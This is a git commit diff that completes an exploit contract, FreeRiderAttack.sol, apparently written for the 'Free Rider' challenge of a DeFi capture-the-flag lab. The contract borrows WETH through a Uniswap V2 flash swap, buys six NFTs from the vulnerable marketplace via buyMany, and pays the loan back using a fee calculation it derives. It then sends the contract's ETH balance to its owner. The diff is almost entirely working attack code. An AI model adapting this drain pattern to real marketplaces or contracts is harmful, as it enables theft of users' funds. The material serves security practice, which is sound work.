b0f7107de30bf995c8b922e805f0cdf07221be37
zhao.lu <luzhao233@gmail.com>
2022-06-28 10:46:05 +0800

    complete free-rider

--- contracts/free-rider/FreeRiderAttack.sol
+++ contracts/free-rider/FreeRiderAttack.sol
@@ -23,6 +23,7 @@ interface IUniswapV2Callee {
 
 interface IUniswapV2Pair{
     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
+    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
 }
 
 
@@ -55,18 +56,13 @@ contract FreeRiderAttack is Ownable, IUniswapV2Callee, IERC721Receiver{
         }
 
         // drain all token
-        console.log(address(this).balance);
-
         _weth.withdraw(_weth.balanceOf(address(this)));
-        console.log(address(this).balance);
         payable(owner()).call{value: address(this).balance}("");
     }
 
     function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
-        console.log(address(this).balance);
         uint amount = abi.decode(data, (uint));
         _weth.withdraw(_weth.balanceOf(address(this)));
-        console.log(address(this).balance);
         uint[] memory tokenIds = new uint[](6);
         tokenIds[0] = 0;
         tokenIds[1] = 1;
@@ -76,11 +72,30 @@ contract FreeRiderAttack is Ownable, IUniswapV2Callee, IERC721Receiver{
         tokenIds[5] = 5;
 
         _freeRiderNFTMarketplace.buyMany{value: amount}(tokenIds);
-        console.log(address(this).balance);
-        _weth.deposit{value: amount.div(1000).mul(3) + amount}();
-        // pay back
-        _weth.transfer(address(_uniswapV2Pair), amount.div(1000).mul(3) + amount);
 
+        uint balance0 = _weth.balanceOf(address(_uniswapV2Pair));
+        uint balance1 = _token.balanceOf(address(_uniswapV2Pair));
+        console.log("balance0 is %s  balance1 is %s", _weth.balanceOf(address(_uniswapV2Pair)), _token.balanceOf(address(_uniswapV2Pair)));
+        (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) = _uniswapV2Pair.getReserves();
+        console.log("_reserve0 is %s, _reserve1 is %s", _reserve0, _reserve1);
+        uint refundAmount = computeRefund(balance0, amount0, _reserve0);
+        console.log("refundAmount is %s", refundAmount);
+        _weth.deposit{value: refundAmount}();
+        // pay back
+        _weth.transfer(address(_uniswapV2Pair), refundAmount);
+
+    }
+
+    // for simplify, balance0 is out token
+    function computeRefund(uint currentBalance0, uint amount0Out, uint _reserve0) private view returns(uint refundAmount) {
+        // uint(_reserve0).mul(1000) / (bal * 1000 - (bal - (_reserve0 - amount0Out)) * 3)
+        // uint(_reserve0).mul(1000) < (bal * 997 + 3 * _reserve0 - amount0Out * 3)
+        // (bal * 997 + 3 * _reserve0 - amount0Out * 3) - uint(_reserve0).mul(1000) >= 0
+        // bal * 997  >= uint(_reserve0).mul(1000) + amount0Out * 3 - 3 * _reserve0
+        // (bal * 997 + 3 * _reserve0 - amount0Out * 3) - uint(_reserve0).mul(1000) >= 0
+
+        return (uint(_reserve0).mul(1000) + amount0Out * 3 - 3 * _reserve0) / 997 - currentBalance0 + 1;
+        // btw, for simply, can /996, can pass _uniswapV2Pair check
     }
 
     // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
